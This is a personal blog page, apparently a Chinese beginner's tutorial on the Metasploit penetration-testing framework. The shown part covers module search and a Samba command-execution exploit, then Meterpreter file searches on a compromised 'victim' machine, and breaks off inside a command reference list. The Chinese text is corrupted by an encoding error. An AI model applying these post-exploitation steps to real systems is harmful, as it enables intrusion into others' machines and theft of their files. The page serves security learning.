<!DOCTYPE html>

<html lang="en">

<head>
  
  <title>metasploitå°ç™½æ•™ç¨‹æ€»ç»“ - pggå­¦é•¿</title>
  <meta charset="UTF-8">
  <meta name="description" content="é’ˆå¯¹äºæ¸—é€æµ‹è¯•æœŸé—´é‡åˆ°çš„å„ç§å‘çš„è§£å†³æ–¹æ³•ï¼Œä¸ä¸€äº›æ¼æ´çš„å¤ç°æ•™ç¨‹è€Œæ­å»ºçš„åšå®¢ã€‚">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
  
  
    <!-- Site Verification -->
    <meta name="google-site-verification" content="true" />


    <!-- Site Verification -->
    <meta name="baidu-site-verification" content="true" />

  <link rel="shortcut icon" href="https://cdn.jsdelivr.net/gh/pggbo/pggbo.github.io@master/css/tupian/pgg.png" type="image/png" />
  <meta name="description" content="msfå°ç™½å­¦ä¹ æ•™ç¨‹ä¸€">
<meta property="og:type" content="article">
<meta property="og:title" content="metasploitå°ç™½æ•™ç¨‹æ€»ç»“">
<meta property="og:url" content="http://example.com/2020/12/23/Metasploit/index.html">
<meta property="og:site_name" content="pggå­¦é•¿">
<meta property="og:description" content="msfå°ç™½å­¦ä¹ æ•™ç¨‹ä¸€">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/pggbo/pggbo.github.io@master/css/tupian/013.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/pggbo/pggbo.github.io@master/css/tupian/014.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/pggbo/pggbo.github.io@master/css/tupian/015.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/pggbo/pggbo.github.io@master/css/tupian/016.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/pggbo/pggbo.github.io@master/css/tupian/017.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/pggbo/pggbo.github.io@master/css/tupian/018.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/pggbo/pggbo.github.io@master/css/tupian/019.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/pggbo/pggbo.github.io@master/css/tupian/020.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/pggbo/pggbo.github.io@master/css/tupian/021.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/pggbo/pggbo.github.io@master/css/tupian/022.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/pggbo/pggbo.github.io@master/css/tupian/023.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/pggbo/pggbo.github.io@master/css/tupian/024.png">
<meta property="og:image" content="https://cdn.jsdelivr.net/gh/pggbo/pggbo.github.io@master/css/tupian/025.png">
<meta property="article:published_time" content="2020-12-23T07:46:25.000Z">
<meta property="article:modified_time" content="2020-12-30T03:04:31.675Z">
<meta property="article:author" content="zh-CN">
<meta property="article:tag" content="pggå­¦é•¿">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/pggbo/pggbo.github.io@master/css/tupian/013.png">
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/combine/npm/highlight.js@9.15.8/styles/atom-one-dark.css,gh/nexmoe/nexmoe.github.io@latest/lib/mdui_043tiny/css/mdui.css,gh/nexmoe/nexmoe.github.io@latest/lib/iconfont/iconfont.css,gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css?v=233" crossorigin>
  
  <link rel="stylesheet" href="/css/style.css?v=1609298466933">
<meta name="generator" content="Hexo 5.2.0"></head>

<body class="mdui-drawer-body-left">
  
  <div id="nexmoe-background">
    <div class="nexmoe-bg" style="background-image: url(https://cdn.jsdelivr.net/gh/pggbo/pggbo.github.io@master/css/tupian/0002.png)"></div>
    <div class="mdui-appbar mdui-shadow-0">
      <div class="mdui-toolbar">
        <a mdui-drawer="{target: '#drawer', swipe: true}" title="menu" class="mdui-btn mdui-btn-icon mdui-ripple"><i class="mdui-icon nexmoefont icon-menu"></i></a>
        <div class="mdui-toolbar-spacer"></div>
        <!--<a href="javascript:;" class="mdui-btn mdui-btn-icon"><i class="mdui-icon material-icons">search</i></a>-->
        <a href="/" title="zh-CN" class="mdui-btn mdui-btn-icon"><img src="https://cdn.jsdelivr.net/gh/pggbo/pggbo.github.io@master/css/tupian/0001.png" alt="zh-CN"></a>
       </div>
    </div>
  </div>
  <div id="nexmoe-header">
      <div class="nexmoe-drawer mdui-drawer" id="drawer">
    <div class="nexmoe-avatar mdui-ripple">
        <a href="/" title="zh-CN">
            <img src="https://cdn.jsdelivr.net/gh/pggbo/pggbo.github.io@master/css/tupian/0001.png" alt="zh-CN" alt="zh-CN">
        </a>
    </div>
    <div class="nexmoe-count">
        <div><span>æ–‡ç« </span>2</div>
        <div><span>æ ‡ç­¾</span>0</div>
        <div><span>åˆ†ç±»</span>0</div>
    </div>
    <div class="nexmoe-list mdui-list" mdui-collapse="{accordion: true}">
        
        <a class="nexmoe-list-item mdui-list-item mdui-ripple" href="/" title="å›åˆ°é¦–é¡µ">
            <i class="mdui-list-item-icon nexmoefont icon-home"></i>
            <div class="mdui-list-item-content">
                å›åˆ°é¦–é¡µ
            </div>
        </a>
        
        <a class="nexmoe-list-item mdui-list-item mdui-ripple" href="/archives" title="æ–‡ç« å½’æ¡£">
            <i class="mdui-list-item-icon nexmoefont icon-container"></i>
            <div class="mdui-list-item-content">
                æ–‡ç« å½’æ¡£
            </div>
        </a>
        
        <a class="nexmoe-list-item mdui-list-item mdui-ripple" href="/about" title="å…³äºåšå®¢">
            <i class="mdui-list-item-icon nexmoefont icon-info-circle"></i>
            <div class="mdui-list-item-content">
                å…³äºåšå®¢
            </div>
        </a>
        
        <a class="nexmoe-list-item mdui-list-item mdui-ripple" href="/py" title="æˆ‘çš„æœ‹å‹">
            <i class="mdui-list-item-icon nexmoefont icon-unorderedlist"></i>
            <div class="mdui-list-item-content">
                æˆ‘çš„æœ‹å‹
            </div>
        </a>
        
    </div>
    <aside id="nexmoe-sidebar">
  
  <div class="nexmoe-widget-wrap">
    <div class="nexmoe-widget nexmoe-search">
        <form id="search_form" action_e="https://www.baidu.com/search?q=site:pgg666.com" onsubmit="return search();">
            <label><input id="search_value" name="q" type="search" placeholder="æœç´¢"></label>
        </form>
    </div>
</div>
  
  <div class="nexmoe-widget-wrap">
    <div class="nexmoe-widget nexmoe-social">
        <a class="mdui-ripple" href="/885022885" target="_blank" mdui-tooltip="{content: 'æ·»åŠ åšä¸»QQ:885022885'}" style="color: rgb(249, 174, 8);background-color: rgba(249, 174, 8, .1);">
            <i class="nexmoefont icon-QQ"></i>
        </a><a class="mdui-ripple" href="https://t.zsxq.com/Fam2FqR" target="_blank" mdui-tooltip="{content: 'çŸ¥è¯†æ˜Ÿçƒ:ç™½å¸½å­è°ˆå®‰å…¨'}" style="color: rgb(231, 106, 141);background-color: rgba(231, 106, 141, .15);">
            <i class="nexmoefont icon-bilibili"></i>
        </a><a class="mdui-ripple" href="https://github.com/pggbo/" target="_blank" mdui-tooltip="{content: 'GitHub'}" style="color: rgb(25, 23, 23);background-color: rgba(25, 23, 23, .15);">
            <i class="nexmoefont icon-github"></i>
        </a>
    </div>
</div>
  
  

  
  
  
  
  <div class="nexmoe-widget-wrap">
    <h3 class="nexmoe-widget-title">æ–‡ç« å½’æ¡£</h3>
    <div class="nexmoe-widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/">2020</a><span class="archive-list-count">2</span></li></ul>
    </div>
  </div>


<style>
.nexmoe-widget .archive-list-count{
	position : absolute;
	right: 15px;
	top:9px;
	color: #DDD;
}
</style>

  
</aside>
    <div class="nexmoe-copyright">
        &copy; 2020 zh-CN
        Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
        & <a href="https://github.com/theme-nexmoe/hexo-theme-nexmoe" target="_blank">Nexmoe</a>
    </div>
</div><!-- .nexmoe-drawer -->
  </div>
  <div id="nexmoe-content">
    <div class="nexmoe-primary">
        <div class="nexmoe-post">
  
      <div class="nexmoe-post-cover" style="padding-bottom: NaN%;"> 
          <img data-src="https://cdn.jsdelivr.net/gh/pggbo/pggbo.github.io@master/css/tupian/026.png" data-sizes="auto" alt="metasploitå°ç™½æ•™ç¨‹æ€»ç»“" class="lazyload">
          <h1>metasploitå°ç™½æ•™ç¨‹æ€»ç»“</h1>
      </div>
  
  
  <div class="nexmoe-post-meta nexmoe-rainbow" style="margin:10px 0!important;">
    <a><i class="nexmoefont icon-calendar-fill"></i>2020å¹´12æœˆ23æ—¥</a>
    <a><i class="nexmoefont icon-areachart"></i>5,116 å­—</a>
    <a><i class="nexmoefont icon-time-circle-fill"></i>å¤§æ¦‚ 21 åˆ†é’Ÿ</a>
</div>

  <div class="nexmoe-post-right">
    
      <div class="nexmoe-fixed">
        <div class="nexmoe-valign">
            <div class="nexmoe-toc">
                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#msf%E5%B0%8F%E7%99%BD%E5%AD%A6%E4%B9%A0%E6%95%99%E7%A8%8B%E4%B8%80"><span class="toc-number">1.</span> <span class="toc-text">msfå°ç™½å­¦ä¹ æ•™ç¨‹ä¸€</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-msf%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-number">1.0.1.</span> <span class="toc-text">1.msfæ˜¯ä»€ä¹ˆï¼Ÿ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-msf%E7%9A%84%E8%AF%A6%E7%BB%86%E5%88%86%E8%A7%A3"><span class="toc-number">1.0.2.</span> <span class="toc-text">2.msfçš„è¯¦ç»†åˆ†è§£</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1%E6%90%9C%E7%B4%A2%E6%A8%A1%E5%9D%97"><span class="toc-number">1.0.2.1.</span> <span class="toc-text">2.1æœç´¢æ¨¡å—</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#2-1-1-%E6%90%9C%E7%B4%A2%E6%A8%A1%E5%9D%97%E5%91%BD%E4%BB%A4%EF%BC%9Asearch"><span class="toc-number">1.0.2.1.1.</span> <span class="toc-text">2.1.1 æœç´¢æ¨¡å—å‘½ä»¤ï¼šsearch</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-1-2-help"><span class="toc-number">1.0.2.1.2.</span> <span class="toc-text">2.1.2 help</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2-msf%E4%B8%8Emeterpreter%E5%91%BD%E4%BB%A4%E5%A4%A7%E5%85%A8"><span class="toc-number">1.0.2.2.</span> <span class="toc-text">2.2 msfä¸meterpreterå‘½ä»¤å¤§å…¨</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#2-2-1-msf%E5%91%BD%E4%BB%A4"><span class="toc-number">1.0.2.2.1.</span> <span class="toc-text">2.2.1 msfå‘½ä»¤</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-2-2-meterpreter%E5%91%BD%E4%BB%A4"><span class="toc-number">1.0.2.2.2.</span> <span class="toc-text">2.2.2 meterpreterå‘½ä»¤</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-3-msf%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC%E6%95%99%E7%A8%8B"><span class="toc-number">1.0.2.3.</span> <span class="toc-text">2.3 msfç”Ÿæˆæœ¨é©¬æ•™ç¨‹</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#2-3-1-%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC%E5%91%BD%E4%BB%A4%EF%BC%9Amsfvenom"><span class="toc-number">1.0.2.3.1.</span> <span class="toc-text">2.3.1 ç”Ÿæˆæœ¨é©¬å‘½ä»¤ï¼šmsfvenom</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-3-2-%E7%94%9F%E6%88%90%E6%9C%A8%E9%A9%AC%E8%AF%AD%E5%8F%A5"><span class="toc-number">1.0.2.3.2.</span> <span class="toc-text">2.3.2 ç”Ÿæˆæœ¨é©¬è¯­å¥</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-4-%E9%93%BE%E6%8E%A5%E9%92%93%E9%B1%BC"><span class="toc-number">1.0.2.4.</span> <span class="toc-text">2.4 é“¾æ¥é’“é±¼</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#2-5-1-route%E6%B7%BB%E5%8A%A0%E8%B7%AF%E7%94%B1"><span class="toc-number">1.0.2.4.1.</span> <span class="toc-text">2.5.1 routeæ·»åŠ è·¯ç”±</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-5-2-autoroute-%E6%B7%BB%E5%8A%A0%E8%B7%AF%E7%94%B1"><span class="toc-number">1.0.2.4.2.</span> <span class="toc-text">2.5.2 autoroute æ·»åŠ è·¯ç”±</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-5-3-portfwd-%E6%B7%BB%E5%8A%A0%E8%B7%AF%E7%94%B1"><span class="toc-number">1.0.2.4.3.</span> <span class="toc-text">2.5.3 portfwd æ·»åŠ è·¯ç”±</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-6-%E9%9A%90%E8%BA%AB%E4%BB%A4%E7%89%8C%E6%94%BB%E5%87%BB"><span class="toc-number">1.0.2.5.</span> <span class="toc-text">2.6 éšèº«ä»¤ç‰Œæ”»å‡»</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-7-%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3"><span class="toc-number">1.0.2.6.</span> <span class="toc-text">2.7 å¯†ç ç ´è§£</span></a></li></ol></li></ol></li></ol></li></ol>
            </div>
        </div>
      </div>
    
  </div>

  <article>
    <h1 id="msfå°ç™½å­¦ä¹ æ•™ç¨‹ä¸€"><a href="#msfå°ç™½å­¦ä¹ æ•™ç¨‹ä¸€" class="headerlink" title="msfå°ç™½å­¦ä¹ æ•™ç¨‹ä¸€"></a><center>msfå°ç™½å­¦ä¹ æ•™ç¨‹ä¸€</center></h1><a id="more"></a>
<p>ä½œè€…ï¼špggå­¦é•¿<br>å‰è¨€ï¼šè®°å¾—ä»¥å‰è€å¸ˆæ•™çš„è¿˜æ˜¯æŒºè®¤çœŸçš„ï¼Œä½†æ˜¯å¥½ä¹…æ²¡ç”¨ï¼Œæœ‰äº›ç”Ÿç–ï¼Œäºæ˜¯å°±å€Ÿåœ¨å­¦æ ¡å­¦ä¹ æ—¶å¤ä¹ äº†ä¸€éï¼Œé¡ºä¾¿å†™ä¸‹äº†è¿™ç¯‡æ–‡ç« ã€‚</p>
<hr>
<h3 id="1-msfæ˜¯ä»€ä¹ˆï¼Ÿ"><a href="#1-msfæ˜¯ä»€ä¹ˆï¼Ÿ" class="headerlink" title="1.msfæ˜¯ä»€ä¹ˆï¼Ÿ"></a>1.msfæ˜¯ä»€ä¹ˆï¼Ÿ</h3><p>msfå…¨ç§°ï¼šmetasplpit<br>   ä½œç”¨ï¼šMetasploitæ˜¯ä¸€ä¸ªæ¸—é€æµ‹è¯•å¹³å°<br>   ç¯å¢ƒï¼škali-linux è‡ªåŠ¨æ­å»ºäº†msfç¯å¢ƒ  </p>
<h3 id="2-msfçš„è¯¦ç»†åˆ†è§£"><a href="#2-msfçš„è¯¦ç»†åˆ†è§£" class="headerlink" title="2.msfçš„è¯¦ç»†åˆ†è§£"></a>2.msfçš„è¯¦ç»†åˆ†è§£</h3><p><em>åœ¨è¿™è¾¹æˆ‘å°±åŒ–ç¹ä¸ºç®€ï¼ŒæŠŠä¸€äº›æˆ‘æ„Ÿè§‰é‡è¦å¸¸ç”¨çš„åŠŸèƒ½è¯¦ç»†çš„è®²è§£ä¸€ç•ªã€‚</em>  </p>
<h4 id="2-1æœç´¢æ¨¡å—"><a href="#2-1æœç´¢æ¨¡å—" class="headerlink" title="2.1æœç´¢æ¨¡å—"></a>2.1æœç´¢æ¨¡å—</h4><p>é¦–å…ˆè‚¯å®šæ˜¯å¯åŠ¨msfï¼Œå¯åŠ¨å°±å¾ˆç®€å•äº†ï¼Œåœ¨kaliå‘½ä»¤è¡Œè¾“å…¥:<code>msfconsole </code> å¦‚æœè®°ä¸ä½ï¼Œå¯ä»¥ç›´æ¥ï¼š<code>msfc</code>ç„¶ååŠ ä¸€ä¸ªtabï¼Œç„¶åå°±ä¼šè‡ªåŠ¨è¡¥å…¨ï¼Œå›è½¦å°±å¥½äº†ã€‚<br><img src="https://cdn.jsdelivr.net/gh/pggbo/pggbo.github.io@master/css/tupian/013.png"><br><img src="https://cdn.jsdelivr.net/gh/pggbo/pggbo.github.io@master/css/tupian/014.png">  </p>
<hr>
<h5 id="2-1-1-æœç´¢æ¨¡å—å‘½ä»¤ï¼šsearch"><a href="#2-1-1-æœç´¢æ¨¡å—å‘½ä»¤ï¼šsearch" class="headerlink" title="2.1.1 æœç´¢æ¨¡å—å‘½ä»¤ï¼šsearch"></a>2.1.1 æœç´¢æ¨¡å—å‘½ä»¤ï¼š<code>search</code></h5><p>å‘½ä»¤ä»‹ç»ï¼šmsfconsoleåŒ…å«å¹¿æ³›çš„åŸºäºæ­£åˆ™è¡¨è¾¾å¼çš„æœç´¢åŠŸèƒ½ã€‚å¦‚æœæ‚¨å¯¹æ‰€æŸ¥æ‰¾å†…å®¹æœ‰ä¸€ä¸ªå¤§è‡´çš„äº†è§£ï¼Œåˆ™å¯ä»¥é€šè¿‡æœç´¢è¿›è¡Œæœç´¢ã€‚åœ¨ä¸‹é¢çš„è¾“å‡ºä¸­ï¼Œæ­£åœ¨æœç´¢MS Bulletin MS09-011ã€‚æœç´¢åŠŸèƒ½å°†åœ¨æ¨¡å—åç§°ï¼Œæè¿°ï¼Œå¼•ç”¨ç­‰å†…æ‰¾åˆ°è¯¥å­—ç¬¦ä¸²ã€‚</p>
<p>è¯·æ³¨æ„ï¼ŒMetasploitæ¨¡å—çš„å‘½åçº¦å®šä½¿ç”¨ä¸‹åˆ’çº¿å’Œè¿å­—ç¬¦ã€‚<br>msf &gt; search usermap_script</p>
<p>Name                                Disclosure Date  Rank       Description</p>
<hr>
<p>   exploit/multi/samba/usermap_script    2007-05-14       excellent  Samba â€œusername map scriptâ€ Command Execution</p>
<h5 id="2-1-2-help"><a href="#2-1-2-help" class="headerlink" title="2.1.2 help"></a>2.1.2 help</h5><p>æ‚¨å¯ä»¥ä½¿ç”¨å†…ç½®çš„å…³é”®å­—ç³»ç»Ÿè¿›ä¸€æ­¥ä¼˜åŒ–æ‚¨çš„æœç´¢ã€‚å‘½ä»¤ï¼š<code>help search</code><br><img src="https://cdn.jsdelivr.net/gh/pggbo/pggbo.github.io@master/css/tupian/015.png"><br><img src="https://cdn.jsdelivr.net/gh/pggbo/pggbo.github.io@master/css/tupian/016.png"></p>
<p>è¦ä½¿ç”¨æè¿°æ€§åç§°è¿›è¡Œæœç´¢ï¼Œè¯·ä½¿ç”¨nameå…³é”®å­—ã€‚<br><img src="https://cdn.jsdelivr.net/gh/pggbo/pggbo.github.io@master/css/tupian/017.png"></p>
<p>æ‚¨å¯ä»¥ä½¿ç”¨platformå°†æœç´¢èŒƒå›´ç¼©å°åˆ°å½±å“ç‰¹å®šplatformï¼ˆå¹³å°ï¼‰çš„æ¨¡å—ã€‚<br><img src="https://cdn.jsdelivr.net/gh/pggbo/pggbo.github.io@master/css/tupian/018.png"></p>
<p>ä½¿ç”¨è¯¥typeå¯ä»¥æŒ‰æ¨¡å—ç±»å‹è¿›è¡Œè¿‡æ»¤ï¼Œå¦‚auxiliaryï¼ˆè¾…åŠ©ï¼‰ï¼Œpostï¼ˆæäº¤ï¼‰ï¼Œexploitï¼ˆåˆ©ç”¨ï¼‰ç­‰ã€‚</p>
<p><img src="https://cdn.jsdelivr.net/gh/pggbo/pggbo.github.io@master/css/tupian/019.png"><br>ä½¿ç”¨authorå…³é”®å­—æœç´¢å¯è®©æ‚¨æœç´¢æ‚¨æœ€å–œçˆ±çš„ä½œè€…çš„æ¨¡å—<br><img src="https://cdn.jsdelivr.net/gh/pggbo/pggbo.github.io@master/css/tupian/020.png"><br>å½“ç„¶ï¼Œ<code>search</code>å‘½ä»¤è¿˜å¯ä»¥åœ¨æ‹¿åˆ°ä¸€å®šæƒé™æ—¶ï¼Œå¯ä»¥åœ¨å—å®³è€…æœºå™¨å†…æœç´¢æƒ³è¦çš„ä¿¡æ¯<br>Meterpreterå…·æœ‰æœç´¢åŠŸèƒ½ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œè¯¥åŠŸèƒ½å°†æ¸…é™¤å—æ„ŸæŸ“è®¡ç®—æœºä¸Šçš„æ‰€æœ‰é©±åŠ¨å™¨ï¼Œä»¥æŸ¥æ‰¾æ‚¨é€‰æ‹©çš„æ–‡ä»¶ã€‚<br>meterpreter &gt; search -h<br>Usage: search [-d dir] [-r recurse] -f pattern<br>Search for files.<br>OPTIONS:<br>-d   å¼€å§‹ä»ä¸­æœç´¢çš„ ç›®å½•/é©±åŠ¨å™¨ã€‚ ç•™ç©ºä»¥æœç´¢æ‰€æœ‰é©±åŠ¨å™¨ã€‚ ï¼ˆé»˜è®¤ï¼šï¼‰<br>    -f   è¦æœç´¢çš„æ–‡ä»¶æ¨¡å¼globã€‚ ï¼ˆä¾‹å¦‚* secret * .docï¼Ÿï¼‰<br>    -h   å¸®åŠ©æ¨ªå¹…ã€‚<br>    -r   é€’å½’æœç´¢å­ç›®å½•ã€‚ ï¼ˆé»˜è®¤ï¼štrueï¼‰<br>Â <br>è¦åœ¨è®¡ç®—æœºä¸Šè¿è¡Œæ‰€æœ‰jpegæ–‡ä»¶æœç´¢ï¼Œåªéœ€ä½¿ç”¨â€™-fâ€™å¼€å…³è¿è¡Œæœç´¢å‘½ä»¤å¹¶å‘Šè¯‰å®ƒè¦æŸ¥æ‰¾å“ªç§æ–‡ä»¶ç±»å‹ã€‚<br>meterpreter &gt; search -f *.jpg<br>Found 418 resultsâ€¦<br>â€¦snipâ€¦<br>    c:\Documents and Settings\All Users\Documents\My Pictures\Sample Pictures\Blue hills.jpg (28521 bytes)<br>    c:\Documents and Settings\All Users\Documents\My Pictures\Sample Pictures\Sunset.jpg (71189 bytes)<br>    c:\Documents and Settings\All Users\Documents\My Pictures\Sample Pictures\Water lilies.jpg (83794 bytes)<br>    c:\Documents and Settings\All Users\Documents\My Pictures\Sample Pictures\Winter.jpg (105542 bytes)<br>â€¦snipâ€¦<br>Â <br>æœç´¢æ•´å°è®¡ç®—æœºå¯èƒ½éœ€è¦å¾ˆé•¿æ—¶é—´ï¼Œå¹¶ä¸”è§‚å¯Ÿç”¨æˆ·å¯èƒ½ä¼šæ³¨æ„åˆ°ä»–ä»¬çš„ç¡¬ç›˜ä¸æ–­é¢ ç°¸ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡å°†å®ƒæŒ‡å‘ä¸€ä¸ªèµ·å§‹ç›®å½•å¹¶è®©å®ƒè¿è¡Œæ¥ç¼©çŸ­æœç´¢æ—¶é—´ã€‚<br>meterpreter &gt; search -d c:\documents\ and\ settings\administrator\desktop\ -f *.pdf<br>Found 2 resultsâ€¦<br>    c:\documents and settings\administrator\desktop\operations_plan.pdf (244066 bytes)<br>    c:\documents and settings\administrator\desktop\budget.pdf (244066 bytes)<br>meterpreter &gt;</p>
<h4 id="2-2-msfä¸meterpreterå‘½ä»¤å¤§å…¨"><a href="#2-2-msfä¸meterpreterå‘½ä»¤å¤§å…¨" class="headerlink" title="2.2 msfä¸meterpreterå‘½ä»¤å¤§å…¨"></a>2.2 msfä¸meterpreterå‘½ä»¤å¤§å…¨</h4><h5 id="2-2-1-msfå‘½ä»¤"><a href="#2-2-1-msfå‘½ä»¤" class="headerlink" title="2.2.1 msfå‘½ä»¤"></a>2.2.1 msfå‘½ä»¤</h5><hr>
<p>æ ¸å¿ƒå‘½ä»¤<br>ï¼ŸÂ  Â å¸®åŠ©èœå•<br>bannerÂ  Â æ˜¾ç¤ºä¸€ä¸ªçœŸæ£’metasploitæ¨ªå¹…<br>cdÂ  Â æ›´æ”¹å½“å‰çš„å·¥ä½œç›®å½•<br>colorÂ  Â åˆ‡æ¢é¢œè‰²<br>connectÂ  Â è¿æ¥ä¸ä¸»æœºé€šä¿¡<br>exitÂ  Â é€€å‡ºæ§åˆ¶å°<br>getÂ  Â è·å–ç‰¹å®šäºä¸Šä¸‹æ–‡çš„å˜é‡çš„å€¼<br>getgÂ  Â è·å–å…¨å±€å˜é‡çš„å€¼<br>grep grepå¦ä¸€ä¸ªå‘½ä»¤çš„è¾“å‡º<br>helpÂ  Â å¸®åŠ©èœå•<br>historyÂ  Â æ˜¾ç¤ºå‘½ä»¤å†å²<br>irbÂ  Â è¿›å…¥irbè„šæœ¬æ¨¡å¼<br>loadÂ  Â åŠ è½½ä¸€ä¸ªæ¡†æ¶æ’ä»¶<br>quitÂ  Â é€€å‡ºæ§åˆ¶å°<br>routeÂ  Â é€šè¿‡ä¼šè¯è·¯ç”±æµé‡<br>saveÂ  Â ä¿å­˜æ´»åŠ¨çš„æ•°æ®å­˜å‚¨<br>sessionsÂ  Â  è½¬å‚¨ä¼šè¯åˆ—è¡¨å¹¶æ˜¾ç¤ºæœ‰å…³ä¼šè¯çš„ä¿¡æ¯<br>setÂ  Â å°†ç‰¹å®šäºä¸Šä¸‹æ–‡çš„å˜é‡è®¾ç½®ä¸ºä¸€ä¸ªå€¼<br>setgÂ  Â å°†å…¨å±€å˜é‡è®¾ç½®ä¸ºä¸€ä¸ªå€¼<br>sleepÂ  Â åœ¨æŒ‡å®šçš„ç§’æ•°å†…ä¸åšä»»ä½•äº‹æƒ…<br>spoolÂ  Â å°†æ§åˆ¶å°è¾“å‡ºå†™å…¥æ–‡ä»¶ä»¥åŠå±å¹•<br>threadsÂ  Â çº¿ç¨‹æŸ¥çœ‹å’Œæ“ä½œåå°çº¿ç¨‹<br>unloadÂ  Â å¸è½½æ¡†æ¶æ’ä»¶<br>unsetÂ  Â å–æ¶ˆè®¾ç½®ä¸€ä¸ªæˆ–å¤šä¸ªç‰¹å®šäºä¸Šä¸‹æ–‡çš„å˜é‡<br>unsetgÂ  Â å–æ¶ˆè®¾ç½®ä¸€ä¸ªæˆ–å¤šä¸ªå…¨å±€å˜é‡<br>versionÂ  Â æ˜¾ç¤ºæ¡†æ¶å’Œæ§åˆ¶å°åº“ç‰ˆæœ¬å·<br>Â <br>æ¨¡å—å‘½ä»¤<br>advancedÂ  Â æ˜¾ç¤ºä¸€ä¸ªæˆ–å¤šä¸ªæ¨¡å—çš„é«˜çº§é€‰é¡¹<br>backÂ  Â ä»å½“å‰ä¸Šä¸‹æ–‡è¿”å›<br>editÂ  Â ä½¿ç”¨é¦–é€‰ç¼–è¾‘å™¨ç¼–è¾‘å½“å‰æ¨¡å—<br>infoÂ  Â æ˜¾ç¤ºæœ‰å…³ä¸€ä¸ªæˆ–å¤šä¸ªæ¨¡å—çš„ä¿¡æ¯<br>loadpathÂ  Â è·¯å¾„ä»è·¯å¾„æœç´¢å¹¶åŠ è½½æ¨¡å—<br>optionsÂ  Â æ˜¾ç¤ºå…¨å±€é€‰é¡¹æˆ–ä¸€ä¸ªæˆ–å¤šä¸ªæ¨¡å—<br>popmÂ  Â å°†æœ€æ–°çš„æ¨¡å—ä»å †æ ˆä¸­å¼¹å‡ºå¹¶ä½¿å…¶å¤„äºæ´»åŠ¨çŠ¶æ€<br>previousÂ  Â å°†ä¹‹å‰åŠ è½½çš„æ¨¡å—è®¾ç½®ä¸ºå½“å‰æ¨¡å—<br>pushmÂ  Â å°†æ´»åŠ¨æˆ–æ¨¡å—åˆ—è¡¨æ¨å…¥æ¨¡å—å †æ ˆ<br>reload_allÂ  Â ä»æ‰€æœ‰å®šä¹‰çš„æ¨¡å—è·¯å¾„é‡æ–°åŠ è½½æ‰€æœ‰æ¨¡å—<br>searchÂ  Â æœç´¢æ¨¡å—åç§°å’Œæè¿°<br>showÂ  Â æ˜¾ç¤ºç»™å®šç±»å‹çš„æ¨¡å—æˆ–æ‰€æœ‰æ¨¡å—<br>useÂ  Â æŒ‰åç§°é€‰æ‹©æ¨¡å—<br>Â <br>å·¥ä½œå‘½ä»¤<br>handlerÂ  Â ä½œä¸ºä½œä¸šå¯åŠ¨è´Ÿè½½å¤„ç†ç¨‹åº<br>jobsÂ  Â æ˜¾ç¤ºå’Œç®¡ç†ä½œä¸š<br>killÂ  Â æ€æ­»ä¸€ä¸ªå·¥ä½œ<br>rename_jobÂ  Â é‡å‘½åä½œä¸š<br>Â <br>èµ„æºè„šæœ¬å‘½ä»¤<br>makercÂ  Â ä¿å­˜ä»å¼€å§‹åˆ°æ–‡ä»¶è¾“å…¥çš„å‘½ä»¤<br>resourceÂ  Â è¿è¡Œå­˜å‚¨åœ¨æ–‡ä»¶ä¸­çš„å‘½ä»¤<br>Â <br>æ•°æ®åº“åç«¯å‘½ä»¤<br>db_connectÂ  Â è¿æ¥åˆ°ç°æœ‰çš„æ•°æ®åº“<br>db_disconnectÂ  Â æ–­å¼€ä¸å½“å‰æ•°æ®åº“å®ä¾‹çš„è¿æ¥<br>db_exportÂ  Â å¯¼å‡ºåŒ…å«æ•°æ®åº“å†…å®¹çš„æ–‡ä»¶<br>db_importÂ  Â å¯¼å…¥æ‰«æç»“æœæ–‡ä»¶ï¼ˆæ–‡ä»¶ç±»å‹å°†è¢«è‡ªåŠ¨æ£€æµ‹ï¼‰<br>db_nmapÂ  Â 